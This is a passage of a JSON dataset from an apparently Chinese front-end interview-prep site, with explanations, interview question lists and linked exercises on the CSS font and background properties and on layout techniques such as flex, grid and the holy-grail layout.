sans-serif; /* 设置标题字体样式 */\n    color: #333; /* 字体颜色 */\n}\n\n.description {\n    font: italic normal 16px/1.8 \"Georgia\", serif; /* 设置描述文本字体样式 */\n    color: #666; /* 字体颜色 */\n}\n```\n\n## 解释\n\n1. **HTML结构**：我们创建了一个包含标题和描述的简单网页。\n2. **CSS样式**：\n\n   - 在 `.title` 类中，使用 `font` 属性设置了字体为加粗、24px大、行高为1.5、字体系列为 `\"Helvetica Neue\"`，后备字体为 `Arial` 和无衬线字体。\n   - 在 `.description` 类中，使用 `font` 属性设置了字体为斜体、正常粗细、16px大、行高为1.8、字体系列为 `\"Georgia\"`，后备字体为衬线字体。\n\n## 结果\n\n通过以上代码，浏览器将展示一个标题和描述文本，标题为加粗大字体，描述为斜体较小字体。这样可以清晰地展示不同文本的样式和视觉层次感。\n\n## 总结\n\nCSS的 `font` 属性是一个非常实用的工具，可以在一个声明中设置多个字体相关的样式。通过合理使用 `font` 属性，可以简化CSS代码，提高可读性，并且能够灵活地控制文本的外观。\n",
    "testPoint": "关于 **`font`** 属性，面试时可以从以下几个方面提问，以考察面试者对其各个组成部分及应用的理解：\n\n### 1. **基本概念**\n   - 请简述 **`font`** 属性的作用。\n   - **`font`** 是一个复合属性，它包含了哪些其他的 CSS 属性？\n   - 当你使用 **`font`** 属性时，它如何影响文本的显示？\n\n### 2. **`font` 的语法**\n   - **`font`** 属性的语法格式是什么？请列举 **`font`** 属性的完整语法结构，并简述每个部分的作用。\n     - 例如：`font: [font-style] [font-variant] [font-weight] [font-size] [line-height] [font-family]`\n   - `font-size` 和 `line-height` 如何在 **`font`** 中配合使用？\n\n### 3. **`font-family`**\n   - **`font-family`** 属性的作用是什么？它如何影响文本的字体显示？\n   - 如何指定多个字体来备选？请解释字体系列的使用。\n   - 什么是 **字体回退机制**？如果指定的字体不存在，浏览器会如何处理？\n   - `font-family` 和 **`font`** 中的字体选择是否有区别？如何优雅地选择字体？\n\n### 4. **`font-size`**\n   - **`font-size`** 属性的作用是什么？请解释不同单位（如 `px`、`em`、`rem`、`vw`）对字体大小的影响。\n   - `font-size` 使用 `em` 和 `rem` 单位时，它们与父元素的字体大小有什么关系？\n   - 如何使用相对单位（如 `em` 或 `rem`）确保响应式设计中的字体大小适配不同屏幕？\n\n### 5. **`font-weight`**\n   - **`font-weight`** 属性的作用是什么？它接受哪些值？\n   - `font-weight` 可以使用数字值（如 100、400、700 等），请解释这些值与常见的字体粗细的关系。\n   - 如何通过 **`font-weight`** 改变字体的粗细？\n\n### 6. **`font-style`**\n   - **`font-style`** 属性的作用是什么？它常用的值有哪些？\n   - 请解释 `italic` 和 `oblique` 的区别。\n   - 如何将文本设置为斜体？\n\n### 7. **`font-variant`**\n   - **`font-variant`** 属性的作用是什么？常见的子属性（如 `normal`、`small-caps`）分别是做什么的？\n   - `font-variant` 和 **`text-transform`** 有什么区别？两者在样式上的作用有什么不同？\n\n### 8. **`line-height`**\n   - **`line-height`** 属性的作用是什么？它如何影响文本的垂直间距？\n   - 如何通过设置 **`line-height`** 来控制文本行之间的距离？\n   - `line-height` 可以使用什么单位？如何选择合适的单位？\n\n### 9. **`font` 与可访问性**\n   - 在设计网页时，如何通过 **`font`** 属性确保文本的可读性和易读性？\n   - 如何为不同的屏幕尺寸或分辨率设置合适的字体大小，确保移动设备用户的良好体验？\n\n### 10. **`font` 与响应式设计**\n   - 在响应式设计中，如何调整 **`font-size`** 和其他字体相关的属性以适应不同的屏幕大小？\n   - 你如何使用媒体查询配合 **`font-size`** 设置字体的动态大小？\n   - 如何确保在不同屏幕尺寸上字体的清晰度和可读性？\n\n### 11. **Web 字体的加载**\n   - 在使用 **Web 字体** 时，如何确保字体的快速加载与显示？请简述常见的 Web 字体加载方法。\n   - 如何通过 `@font-face` 定义自定义字体？使用时需要注意哪些性能问题？\n   - 如何处理 Web 字体的 FOUT（Flash of Unstyled Text）和 FOIT（Flash of Invisible Text）问题？\n\n### 12. **Web 字体与本地字体**\n   - 当使用 Web 字体时，如何为某些操作系统或设备选择合适的备选字体？\n   - `font-family` 和 **Web 字体** 的使用有何关系？你如何选择适合的 Web 字体？\n\n### 13. **`font` 属性的继承**\n   - **`font`** 是继承属性吗？在嵌套元素中，字体样式如何继承？\n   - 如何利用继承简化字体样式的设置？例如，可以通过父元素的 **`font-family`** 来影响所有子元素的字体。\n\n### 14. **实际应用**\n   - 在实际开发中，你如何使用 **`font`** 属性和相关属性（如 `font-size`、`font-family`）来设计网页的排版和布局？\n   - 你如何确保在不同设备和浏览器中，使用 **`font`** 属性时的一致性？\n\n### 15. **常见问题**\n   - 在调整 **`font`** 属性时，如何避免文本溢出、文本对齐不齐或字形不一致的问题？\n   - 如何避免因不同浏览器默认字体不同导致的排版问题？\n   - 当你需要提高网站加载速度时，如何选择字体或调整字体加载方式？\n\n通过这些问题，面试官可以全面评估面试者对 **`font`** 属性的理解，考察其在网页设计中处理字体相关问题的能力，尤其是在不同设备和浏览器环境下的适配、可访问性和性能优化方面。",
    "exerciseKeyList": "[\"c860f93c-430e-4813-b534-0fcfda8b64ba\",\"144bb888-936e-42c8-bdcb-445b5c4dc774\",\"ece0e4b9-112c-4d3c-934c-822e8807fe46\",\"cae03999-2c1e-4ecc-9c66-10c0714c61d6\"]",
    "vipLimit": 0,
    "level": 1,
    "pointOrder": 4,
    "createAt": "2024-10-10T07:49:38.000Z",
    "updateAt": "2024-11-10T05:42:00.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "144bb888-936e-42c8-bdcb-445b5c4dc774",
        "title": "IconFont 的原理是什么",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T01:56:32.000Z",
        "updateAt": "2024-07-19T16:01:04.000Z"
      },
      {
        "exerciseKey": "c860f93c-430e-4813-b534-0fcfda8b64ba",
        "title": "如何检测浏览器所支持的最小字体大小？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-11-17T14:41:41.000Z",
        "updateAt": "2021-11-17T22:49:58.000Z"
      },
      {
        "exerciseKey": "cae03999-2c1e-4ecc-9c66-10c0714c61d6",
        "title": "如何实现单行／多行文本溢出的省略样式？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:27:39.000Z",
        "updateAt": "2024-08-10T17:04:24.000Z"
      },
      {
        "exerciseKey": "ece0e4b9-112c-4d3c-934c-822e8807fe46",
        "title": "iconfont是什么？有什么优缺点？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T01:54:19.000Z",
        "updateAt": "2024-07-22T10:07:45.000Z"
      }
    ]
  },
  "125": {
    "id": 125,
    "tagId": 11,
    "title": "background",
    "explanation": "## 引言\n\n在日常前端开发中，经常需要进行背景或背景图的处理。但是大多数前端er并未真正清楚背景的正确使用方式。经过本章的学习，相信你一定可以解决99%的背景处理问题。\n\n## 一：简单使用\n\n-   背景颜色和背景图片是可以共同出现的\n    \n    ```css\n      div {\n        width: 300px;\n        height: 300px;\n        background-color: red;\n        background-image: url(./imgs/1.jpg);\n        background-repeat: no-repeat; \n       }\n    ```\n    \n\n**页面展示**\n\n![image.png](https://static.ecool.fun//article/58d74c00-38ba-478e-a4a5-b19ac968134b.awebp)\n\n## 一：background-repeat\n\n> background-repeat决定背景图片的平铺方式\n\n**属性值**\n\n```lua\nbackground-repeat:repeat (默认值)\nbackground-repeat:no-repeat (不平铺)\nbackground-repeat:repeat-x （水平方向平铺）\nbackground-repeat:repeat-y （垂直方向平铺）\n\n```\n\n**1\\. repeat**\n\n默认情况下，如果背景图片不能铺满整个盒子时，系统会在水平和垂直方向同时平铺直到覆盖整个盒子\n\n```css\ndiv {\n  width: 300px;\n  height: 300px;\n  background-color: red;\n  background-image: url(./imgs/1.jpg);\n  background-repeat: repeat; \n }\n```\n\n![image.png](https://static.ecool.fun//article/4de4a940-8d08-47fe-abed-b44bed6b814c.awebp)\n\n**2.repeat-x**\n\n如果背景图片不能将盒子的水平方向铺满，则在水平方向采取平铺处理直到铺满盒子的水平方向。\n\n```css\ndiv {\n  width: 300px;\n  height: 300px;\n  background-color: red;\n  background-image: url(./imgs/1.jpg);\n  background-repeat: repeat-x; \n }\n```\n\n![image.png](https://static.ecool.fun//article/69a6934b-fdee-4d8e-b217-89546e84fe24.awebp)\n\n**3.repeat-y**\n\n如果背景图片不能将盒子的垂直方向铺满，则在垂直方向采取平铺处理直到铺满盒子的垂直方向。\n\n```css\ndiv {\n  width: 300px;\n  height: 300px;\n  background-color: red;\n  background-image: url(./imgs/1.jpg);\n  background-repeat: repeat-y; \n }\n```\n\n![image.png](https://static.ecool.fun//article/c580ba90-2689-46eb-a0e1-7df30506ae10.awebp)\n\n## 二：background-position\n\n> background-positiont决定背景图片在盒子区域的定位位置。其方位由水平和垂直决定\n\n**1.px设置**\n\npx决定了背景图片在盒子水平和垂直方向偏移指定px的距离。\n\n```css\ndiv {\n  width: 300px;\n  height: 300px;\n  background-color: red;\n  background-image: url(./imgs/1.jpg);\n  background-repeat: no-repeat;\n  background-position: 100px 100px; \n }\n```\n\n![image.png](https://static.ecool.fun//article/4f06f937-a4dd-4e26-9a94-11be6f49d021.awebp)\n\n**2.方位词**\n\n水平方向:left,center,right\n\n垂直方向:top,center,bottom\n\n> 背景图居中显示\n\n```css\ndiv {\n  width: 300px;\n  height: 300px;\n  background-color: red;\n  background-image: url(./imgs/1.jpg);\n  background-repeat: no-repeat;\n  background-position: center center; \n }\n \n```\n\n![image.png](https://static.ecool.fun//article/d2b6f9ce-170b-450f-8ffb-eadac7c7c155.awebp)\n\n**3.比例**\n\n水平方向= |盒子宽-图片宽| \\* scale\n\n垂直方向= |盒子高-图片高| \\* scale\n\n> 水平和垂直方向的比例偏移位置是按照上面公式计算完成。\n\n如下是背景图居中显示的设置方式\n\n```css\ndiv {\n  width: 300px;\n  height: 300px;\n  background-color: red;\n  background-image: url(./imgs/1.jpg);\n  background-repeat: no-repeat;\n  background-position: 50% 50%; \n }\n \n```\n\n![image.png](https://static.ecool.fun//article/336ced7f-2dbf-45ff-bdc2-3baf3fde0b7c.awebp)\n\n## 三：background缩写方式\n\nbackground有背景颜色，背景图片，是否平铺等多种样式，为了简化css样式，系统提供了背景的简写方式\n\n```arduino\nbackground:color url repeat postion\n```\n\n-   背景的简写可以任意省略其中几个属性\n\n## 三：background-size\n\n> background-size决定背景图在盒子中显示的具体大小，属性值需要同时设置背景图的宽和高。\n\n**1.具体px**\n\n-   直接指定了背景图的宽和高\n    \n-   设置宽高存在背景图变形问题：我们都清楚每张图片都有自己原始的像素，如果我们每次都直接指定其宽和高那么图片的宽和高直接被压缩到指定像素，图片会存在变形的问题，这样十分影响用户体验。\n    \n    ```css\n      div {\n        width: 300px;\n        height: 300px;\n        background-color: red;\n        background-image: url(./imgs/1.jpg);\n        background-repeat: no-repeat;\n        background-size: 200px 50px;\n       }\n    ```\n    \n\n![image.png](https://static.ecool.fun//article/0ade4575-c860-4ae7-82d2-e0cdc9648a24.awebp)\n\n**2\\. 百分比**\n\n-   百分比是相对于盒子的宽和高决定\n    \n-   百分比也存在背景图变形问题\n    \n    ```css\n      div {\n        width: 300px;\n        height: 300px;\n        background-color: red;\n        background-image: url(./imgs/1.jpg);\n        background-repeat: no-repeat;\n        background-size: 50% 10%;\n       }\n    ```\n    \n\n![image.png](https://static.ecool.fun//article/d34e61c5-2b50-49ce-9cfd-1f8d10920eb3.awebp)\n\n**3.auto**\n\n1.  如果宽度是具体数值，高度设置auto,则背景图片的高会根据宽度数值等比拉伸\n2.  如果高度是具体数值，宽度设置auto,则背景图片的宽会根据高度数值等比拉伸\n3.  如果宽高都设置auto,直接使用原背景图的宽高\n\n如下图所示，图片的高度随着宽度等比拉伸，并未出现图片变形问题。\n\n```css\n    div {\n      width: 300px;\n      height: 300px;\n      background-color: red;\n      background-image: url(./imgs/1.jpg);\n      background-repeat: no-repeat;\n      background-size: 200px auto;\n     }\n     \n     \n```\n\n![image.png](https://static.ecool.fun//article/be578f08-9c36-473e-a29f-191098f2745f.awebp)\n\n**4.cover**\n\ncover英文意思覆盖，那么其涵义就是要求背景图片覆盖整个盒子。\n\n> 规则\n\n1.  选择背景图片的宽和高较小的一方\n2.  选择背景图小的一边作为参考，进行背景图的放大或缩小，直到背景图小的一方刚好填充盒子，此时背景图大的一方也会填充盒子。\n\n> 特点\n\n-   宽和高等比拉伸或缩小填满整个盒子，宽和高必须同时填满盒子\n    \n-   图片不变形\n    \n    ```css\n      div {\n        width: 300px;\n        height: 300px;\n        background-color: red;\n        background-image: url(./imgs/1.jpg);\n        background-repeat: no-repeat;\n        background-size:cover;\n       }\n    ```\n    \n\n![image.png](https://static.ecool.fun//article/ad51af59-6a2f-4624-adae-b1995d0e03b0.awebp)\n\n**5.contain**\n\ncontain,要求背景图片的宽和高必须满足其中一个覆盖盒子就行，当图片宽和高都小于盒子时图片会被等比拉伸，如果图片宽或高大于等于盒子宽或者高就停止拉伸。\n\n> 规则\n\n1.  选择背景图片的宽和高较大的一方\n2.  选择背景图大的一边作为参考，进行背景图的放大或缩小，直到背景图大的一方刚好填充盒子。忽略背景图小的一方是否填充。\n\n> 特点\n\n-   宽和高等比拉伸或缩，宽或者高满足一个和盒子宽高相同就行。\n    \n-   图片不变形\n    \n    ```css\n      div {\n        width: 300px;\n        height: 300px;\n        background-color: red;\n        background-image: url(./imgs/1.jpg);\n        background-repeat: no-repeat;\n        background-size: contain;\n       }\n       \n    ```\n    \n\n## 四：background-origin\n\nbackground-origin决定了背景图片从盒子的什么位置开始渲染\n\n**1.background-origin: padding-box(默认值)**\n\n从盒子的padding位置开始\n\n```css\n.box{\n  margin: 20px auto;\n  width: 300px;\n  height: 300px;\n  padding: 50px;\n  border: 50px solid gold;\n  background-color: red;\n  background-image: url(./imgs/1.jpg);\n  background-repeat: no-repeat;\n  background-origin: padding-box;\n}\n\n\n```\n\n![image.png](https://static.ecool.fun//article/2fd06361-67e1-47a1-969d-b26e82d18254.awebp)\n\n**2.background-origin: content-box**\n\n从盒子的内容区域位置开始\n\n```css\n.box{\n  margin: 20px auto;\n  width: 300px;\n  height: 300px;\n  padding: 50px;\n  border: 50px solid gold;\n  background-color: red;\n  background-image: url(./imgs/1.jpg);\n  background-repeat: no-repeat;\n  background-origin: content-box;\n}\n\n\n```\n\n![image.png](https://static.ecool.fun//article/9146a114-54c6-4456-893e-bc167294922a.awebp)\n\n**3.background-origin: border-box**\n\n从盒子的边框区域位置开始\n\n## 五：background-clip\n\nbackground-clip决定了背景颜色从盒子的什么位置开始渲染\n\n1.  background-clip: border-box（从盒子边距开始）\n2.  background-clip: content-box（从盒子内容开始）\n3.  background-clip: padding-box（默认值，从盒子padding开始）",
    "testPoint": "### 1. **基本概念与语法**\n   - **`background`** 是什么？它如何影响元素的视觉展示？\n   - **`background`** 是一个复合属性，它包含了哪些子属性？请简述每个子属性的作用。\n     - 例如：`background-color`、`background-image`、`background-repeat`、`background-position`、`background-size` 等。\n\n### 2. **`background-color`**\n   - **`background-color`** 的作用是什么？它如何影响元素的背景？\n   - 请解释如何使用不同的颜色值（如 `hex`、`rgb`、`rgba`、`hsl`、`hsla`）来设置背景颜色。\n   - 解释 `rgba()` 中的透明度值（0-1），如何控制背景的透明度？\n\n### 3. **`background-image`**\n   - **`background-image`** 的作用是什么？如何将图片设置为背景？\n   - 如何使用 **`background-image`** 设置多个背景图？请举例说明。\n   - 如何通过 **`background-image`** 实现渐变背景？请解释 **`linear-gradient`** 和 **`radial-gradient`**。\n\n### 4. **`background-repeat`**\n   - **`background-repeat`** 的作用是什么？它的常见值有哪些？\n   - 如何通过 **`background-repeat`** 控制背景图的平铺方式？例如，如何设置背景不重复或者只在水平方向上重复？\n   - 如果背景图片尺寸较大，如何防止它在页面上重复？\n\n### 5. **`background-position`**\n   - **`background-position`** 的作用是什么？它如何定位背景图？\n   - 请解释常见的定位值：`top`、`center`、`bottom`、`left`、`right`，以及百分比值如何影响背景位置。\n   - 如何通过 `background-position` 将背景图设置为居中显示？\n\n### 6. **`background-size`**\n   - **`background-size`** 的作用是什么？它如何影响背景图片的显示大小？\n   - 请解释 `background-size: cover` 和 `background-size: contain` 的作用，它们之间有什么区别？\n   - 如何设置背景图的尺寸为具体的像素值或者百分比？\n\n### 7. **`background-attachment`**\n   - **`background-attachment`** 的作用是什么？它的常见取值有哪些？\n   - 请解释 **`background-attachment: fixed`** 和 **`background-attachment: scroll`** 的区别，以及它们对页面滚动的影响。\n\n### 8. **`background-origin` 和 `background-clip`**\n   - **`background-origin`** 属性的作用是什么？它定义了背景的定位区域。\n   - **`background-clip`** 属性的作用是什么？它控制背景绘制的区域。\n   - 如何通过这两个属性控制背景的显示范围？请举例说明。\n\n### 9. **多个背景图**\n   - 如何为一个元素设置多个背景图？请简述 `background-image` 属性的多个值的写法。\n   - 多个背景图如何叠加显示？如何控制它们的顺序和位置？\n   \n### 10. **渐变背景**\n   - 如何使用 **`linear-gradient`** 和 **`radial-gradient`** 来设置渐变背景？\n   - 请解释如何控制渐变的颜色、方向、角度等参数。\n   - 如何创建多色渐变背景？\n\n### 11. **性能优化**\n   - 在使用背景图片时，如何优化加载速度？例如，通过懒加载、图片压缩等手段。\n   - 背景图对页面性能的影响是什么？如何避免大尺寸背景图带来的性能问题？\n\n### 12. **响应式设计中的背景**\n   - 在响应式设计中，如何调整背景图以适应不同的屏幕尺寸？\n   - 如何使用 **媒体查询** 改变背景图或背景颜色？请举例说明。\n\n### 13. **可访问性**\n   - 在使用背景图时，如何确保文本内容的可读性？\n   - 背景颜色与文本颜色的对比度如何影响可访问性？如何选择合适的颜色搭配？\n\n### 14. **实际应用**\n   - 在设计一个按钮时，你如何使用 **`background`** 来实现视觉上的动态效果？例如，设置悬浮时背景色变化，或者背景图的变化。\n   - 如何使用背景图像和背景色配合，创造出视觉上的深度感或层次感？",
    "exerciseKeyList": "[\"c3faa4b5-e73e-47f6-af7b-1f9c73d74126\",\"e34edfe5-0ce6-47f8-9de0-b8a1bfe72be0\"]",
    "vipLimit": 0,
    "level": 0.5,
    "pointOrder": 5,
    "createAt": "2024-10-10T08:00:39.000Z",
    "updateAt": "2024-11-10T05:42:08.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "c3faa4b5-e73e-47f6-af7b-1f9c73d74126",
        "title": "使用原生js实现以下效果：点击容器内的图标，图标边框变成border:1px solid red，点击空白处重置",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-07T04:44:33.000Z",
        "updateAt": "2022-10-30T11:13:33.000Z"
      },
      {
        "exerciseKey": "e34edfe5-0ce6-47f8-9de0-b8a1bfe72be0",
        "title": "下面代码中，p标签的背景色是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-05-08T13:35:14.000Z",
        "updateAt": "2022-05-08T21:35:17.000Z"
      }
    ]
  },
  "126": {
    "id": 126,
    "tagId": 11,
    "title": "布局技巧",
    "explanation": "### 1、普通流（常规流）\n\n文档流（流式布局）分为 普通流、定位流、浮动流，不同流内的块级元素和行内元素的布局方式不同，布局方式用 FC（格式化上下文，含有 块级格式化上下文、内联格式化上下文、层叠格式化上下文、灵活格式化上下文等）来命名；\n\n普通流中的布局规则默认为块级盒子从上到下，垂直排列；内联盒子从左到右，水平排列等；（书写模式（writing-mode）会对流布局产生影响；\n\n### 2、position\n\n属性有：\n\n-   static：默认值，元素依然按照 普通流 的定位规则定位；\n-   relative\n-   absolute\n-   sticky\n-   fixed\n\n使用 position 会脱离常规流，成为定位流，并有其自己的定位规则；\n\n### 3、float\n\n属性有：\n\n-   left\n-   right\n-   none\n-   inherit\n\n使用 float 会脱离常规流，成为浮动流，并有其自己的定位规则；\n\n### 4、table\n\n使用 HTML 标签来布局；\n\n```css\n<table>\n    <tr>\n        <th></th>\n        <th></th>\n    </tr>\n    <tr>\n        <td></td>\n        <td></td>\n    </tr>\n</table>\n```\n\n### 5、flex\n\n2009 年 W3C 提供的方案，注意只有 IE 10+ 支持 flex；\n\n重要的概念：flex 容器，flex 项目，主轴，交叉轴；\n\n设置某个元素的属性 `display: flex;`，此元素就成了 flex 容器，flex 容器内的元素是 flex 项目；\n\n1.  flex 容器的属性：\n    \n    -   flex-direction\n    -   flex-wrap\n    -   flex-flow\n    -   justify-content\n    -   align-items\n    -   align-content\n2.  flex 项目的属性\n    \n    -   flex （flex-grow、flex-shrink、flex-basis）\n    -   order\n    -   align-self\n\n### 6、grid\n\n二维布局方式，相对于使用 HTML 结构实现的 table 布局，grid 布局都是在 CSS 中完成的；\n\n重要的概念：grid 容器、grid 项目、行、列、单元格、网格线；\n\n设置某个元素的属性 `display: grid;` ，此元素就成了 grid 容器，grid 容器的直接子元素就是 grid 项目；\n\n1.  grid 容器的属性\n    \n    -   grid-template-columns\n    -   grid-template-rows\n    -   gap（column-gap、row-gap）\n    -   palce-items（justify-items、align-items）\n    -   place-content（justify-content、align-content）\n    -   grid-template-areas\n    -   grid-auto-flow\n    -   grid-auto-columns、grid-auto-rows\n2.  grid 项目的属性\n    \n    -   grid-column-start、grid-column-end\n        \n        grid-row-start、grid-row-end\n        \n        grid-column\n        \n        grid-row\n        \n    -   grid-area\n        \n    -   justify-self、align-self\n        \n        place-self\n        \n\n  \n\n## 2、常见布局效果\n\n### 1、水平居中\n\n1.  对于子元素为**行内元素**，直接在父元素上加上 `text-align:center;`\n    \n2.  对于子元素为**块级元素**或**行内块级元素**，直接在子元素上加上 `margin:0 auto;`\n    \n    当子元素设置了绝对定位时 `position:absolute;` , 需要在左右加上相等的定位距离 `left:0;right:0;` 才能使用 `margin:0 auto;`\n    \n    为什么 `margin: 0 auto;` 会居中，见： [www.cnblogs.com/sunhang32/p…](https://www.cnblogs.com/sunhang32/p/11826580.html \"https://www.cnblogs.com/sunhang32/p/11826580.html\")\n    \n3.  使用定位 `position:absolute;` + 父元素宽度的 50% 的偏移 `left:50%;` + 回退子元素宽度的 50% `transform:translateX(50%);`\n    \n4.  使用定位 `position:absolute;` + 父元素宽度的 50% 的偏移 `left:50%;` + 回退子元素宽度的 50% `margin-left:-子元素宽度的一半;`\n    \n    水平居中时采用 `margin-left:-子元素宽度的一半;`和 `transform: translateX(-50%);` 两个方案的底层原理有什么不同：margin 会占据空间，transform 是移动，并不会占据原来的空间；\n    \n    补充一个知识点 `margin: 50%;` 是相对于父元素的百分比， `transform: translate(50%, 50%);` 是相对于元素本身的百分比；\n    \n5.  使用 flex 布局或 grid 布局；\n    \n\n### 2、垂直居中\n\n1.  对于单行文本，可以设置 `line-height:父元素高度;` 来达到垂直居中的目的；\n    \n2.  对于行内块级元素，可以通过增加高度为 100% 的伪元素，并增加 `vertical-align:middle;` 属性来改变父元素基线的位置；然后子元素通过 `vertical-align:middle;` 达到垂直居中的目的；\n    \n    ```html\n    <!DOCTYPE html>\n    <html lang=\"en\">\n    <head>\n      <meta charset=\"UTF-8\">\n      <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n      <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n      <title>Document</title>\n      <style>\n        * {\n          padding: 0;\n          margin: 0;\n        }\n        .parent {\n          width: 100px;\n          height: 100px;\n          border: 1px solid black;\n    \n        }\n        .parent::after {\n          content: '';\n          display: inline-block;\n          height:100%;\n          vertical-align:middle;\n        }\n        /* 行内块级元素*/\n        .child {\n          display: inline-block;\n          width: 50px;\n          height: 50px;\n          vertical-align:middle; /* 尝试注释这行代码 */\n          background-color: green;\n        }\n        /* 行内元素*/\n        .child1 {\n          display: inline;\n          background-color: red;\n        }\n      </style>\n    </head>\n    <body>\n      <div class=\"parent\">\n        <div class=\"child\"></div>\n        <div class=\"child1\">ss1</div>\n      </div>\n    </body>\n    </html>\n    \n    ```\n    \n    child 元素不加 `vertical-align:middle;` : ![image.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c83b43f18e5e4f2292747d12b1a2e967~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)\n    \n    child 元素加 `vertical-align:middle;` : ![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/dcd8c3ca7c8b418a9cbfe6c526c41766~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)\n    \n3.  通过设置父元素为 `display:table;` ,子元素为 `display:table-cell;` ，并通过 `vertical-align:middle;` 来将子元素垂直居中；\n    \n4.  使用 flex 布局或 grid 布局；\n    \n\n### 2、两列布局\n\n左边定宽，右边自适应\n\n利用 `float: left;` 和 `overflow: hidden;` 实现；\n\n```css\n.wrapper {\n    width: 50vw;\n    height: 100vh;\n    background-color: grey;\n}\n.left {\n    width: 100px;\n    background-color: red;\n    float: left;\n}\n.right {\n    background-color: green;\n    overflow: hidden;\n    zoom: 1; /*兼容 ie 浏览器*/\n}\n```\n\n利用 flex 布局实现：\n\n```css\n.wrapper {\n    width: 50vw;\n    height: 100vh;\n    display: flex;\n}\n.left {\n    width: 100px;\n}\n.right {\n    flex: 1;\n}\n```\n\n利用 grid 布局实现：\n\n```css\n.wrapper {\n    width: 50vw;\n    height: 100vh;\n    display: grid;\n    grid-template-columns: 100px auto; \n    /*或者：grid-template-columns: 100px 1fr*/\n}\n```\n\n#### 3、三列布局\n\n左右列固定，中间列自适应，要求中间的 HTML 结构先解析；\n\n注意 HTML 结构，这样使得 center 会优先加载：\n\n```css\n<div class=\"wrapper\">\n    <div class=\"center\">content</div>\n    <div class=\"left\">left</div>\n    <div class=\"right\">right</div>\n</div>\n```\n\n#### 1)、flex 布局实现\n\n```css\n.wrapper {\n    display: flex;\n​\n}\n.center {\n     flex: 1;\n     background-color: yellow;\n     order: 1;\n}\n.left {\n    width: 100px;\n    /* flex: 1; */\n    background-color: red;\n​\n}\n.right {\n    width: 100px;\n    background-color: green;\n    order: 2;\n}\n```\n\n#### 2)、grid 布局实现\n\n```css\n.wrapper {\n    display: grid;\n    grid-template-columns: 100px 1fr 100px;\n    grid-auto-flow: row dense;\n​\n}\n.center {\n    grid-column-start: 2;\n    background-color: yellow;\n​\n}\n.left {\n    background-color: red;\n​\n}\n.right {\n    background-color: green;\n}\n```\n\n#### 3)、圣杯布局\n\n利用 float 将三列排到同一行，\n\n再利用负的 margin 将 left 和 right 移动到 center 的两边；\n\n最后增加 wrapper 的 padding，并用相对定位将 left 和 right 定位到 center 的 两边；\n\n```css\n.wrapper {\n    padding: 0 100px;\n}\n.center {\n    width: 100%;\n    float: left;  \n    background-color: yellow;\n}\n.left {\n    width: 100px;\n    float: left;\n    margin-left: -100%;\n    position: relative;\n    left: -100px;\n    background-color: red;\n}\n.right {\n    width: 100px;\n    float: left;\n    margin-left: -100px;\n    position: relative;\n    left: 100px;\n    background-color: green;\n}\n```\n\n#### 4)、双飞翼布局\n\n利用 float 将三列排到同一行，\n\n再利用负的 margin 将 left 和 right 移动到 center 的两边；\n\n再在 center 中新增一个 div ，并设置其 `margin: 0 100px;` 给 left 和 right 留下宽度；\n\n```css\n.wrapper {\n    min-width: 400px; /*需要有一个最小宽度*/\n}\n.center {\n    width: 100%;\n    float: left;  \n    background-color: yellow;\n}\n.center > div {\n    margin: 0 100px; /*在 center 中增加了一个 div，并设置左右 margin 为 left 和 right 的宽度*/\n}\n.left {\n    width: 100px;\n    float: left;\n    margin-left: -100%;\n    background-color: red;\n}\n.right {\n    width: 100px;\n    float: left;\n    margin-left: -100px;\n    background-color: green;\n}\n```\n\n> 原文：https://juejin.cn/post/7070001080960024583\n ",
    "testPoint": "### 1. **传统布局方法**\n- **浮动布局（Float）**：\n  - 理解如何使用 `float` 属性实现文本环绕和布局，且如何清除浮动影响（使用clearfix）。\n  - 常见的浮动布局用了比如侧边栏、网格布局等。\n\n- **定位布局（Position）**：\n  - 理解 `position` 属性的不同值（`static`、`relative`、`absolute`、`fixed`、`sticky`）及其应用场景。\n  - 能够使用绝对定位与相对定位结合来实现复杂的组件布局效果。\n  \n### 2. **Flexbox 布局**\n- **基本概念**：\n  - 理解 Flexbox 的基本原理及其优点，能够解释主轴和交叉轴的概念。\n\n- **常用属性**：\n  - 掌握 Flexbox 的相关属性，如 `display: flex;`、`flex-direction`、`justify-content`、`align-items`、`flex-wrap` 等。\n  \n- **响应式布局**：\n  - 如何利用 Flexbox 自适应不同屏幕尺寸，实现响应式设计。\n\n### 3. **Grid 布局**\n- **基本概念**：\n  - 理解 Grid 布局的基本原理，包括网格容器和网格项的概念。\n\n- **常用属性**：\n  - 掌握 Grid 布局的重要属性，如 `grid-template-columns`、`grid-template-rows`、`grid-area`、`gap` 等。\n\n- **适用场景**：\n  - 能够识别何时使用 Grid 布局和 Flexbox 布局，并解释两者的优缺点。\n\n### 4. **响应式设计**\n- **媒体查询**：\n  - 理解如何使用媒体查询创建自适应布局，能够编写适当的 CSS 代码。\n\n- **相对单位**：\n  - 使用 `em`、`rem`、`vw`、`vh` 等单位来实现响应式布局。\n\n### 5. **盒模型（Box Model）**\n- **理解盒模型**：\n  - 理解 CSS 盒模型的组成部分，包括内容区域、边框、内边距（padding）、外边距（margin）。\n\n- **盒模型的影响**：\n  - 能够讨论如何设置 `box-sizing: border-box;` 来影响布局计算方式，以及它的好处。\n\n### 6. **常见布局模式**\n- **复合布局**：\n  - 能够实现一些常见的布局模式，例如：\n    - 基于 Flexbox 的导航栏\n    - 网格布局的卡片\n    - 响应式图片库\n    - 瀑布流布局\n\n### 7. **CSS 变量与自定义属性**\n- **CSS 变量**：\n  - 理解 CSS 自定义属性（变量）的使用以及它们如何简化和提高布局的可维护性。\n\n### 8. **最佳实践与性能**\n- **代码可读性**：\n  - 优化布局相关 CSS 代码的可读性和可维护性。\n\n- **性能考虑**：\n  - 